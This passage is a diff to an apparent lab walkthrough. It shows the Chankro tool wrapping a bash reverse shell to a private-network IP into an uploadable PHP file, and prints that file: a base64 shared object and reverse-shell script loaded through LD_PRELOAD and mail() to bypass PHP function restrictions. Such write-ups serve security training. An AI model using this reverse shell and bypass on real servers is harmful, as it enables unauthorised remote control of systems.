@@ -465,7 +465,7 @@ Note: path is the absolute path where our .so will be dropped.
 bash -i >& /dev/tcp/192.168.56.101/4444 0>&1 2>&1
 ```
 
-`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html/`:
+`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html`:
 ```
      -=[ Chankro ]=-
     -={ @TheXC3LL }=-
@@ -477,6 +477,27 @@ bash -i >& /dev/tcp/192.168.56.101/4444 0>&1 2>&1
 
 
 [+] File created! ←
+```
+
+`file ./reverse_shell.phtml`:
+```
+./reverse_shell.phtml: PHP script, ASCII text, with very long lines (11352) ←
+```
+
+`cat ./reverse_shell.phtml`:
+```php
+<?php
+ $hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQAAAA
+
+[...]
+
+AAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
+$meterpreter = 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjExOC80NDQ0IDI+JjEgMD4mMQo=';
+file_put_contents('/var/www/html/chankro.so', base64_decode($hook));
+file_put_contents('/var/www/html/acpid.socket', base64_decode($meterpreter));
+putenv('CHANKRO=/var/www/html/acpid.socket');
+putenv('LD_PRELOAD=/var/www/html/chankro.so');
+mail('a','a','a','a');?>              
 ```
 
 `lynx http://192.168.56.112/S3cR3t/upload.php`:
